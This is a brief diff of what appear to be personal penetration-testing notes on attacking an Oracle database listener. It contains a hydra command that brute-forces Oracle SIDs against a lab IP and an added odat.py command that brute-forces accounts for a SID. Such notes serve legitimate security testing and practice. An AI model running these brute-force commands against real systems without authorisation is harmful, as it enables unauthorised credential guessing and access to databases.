@@ -3,3 +3,6 @@ https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
 brute-force SID ::==>
 hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid
 
+by sid, brute-force creds
+
+./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
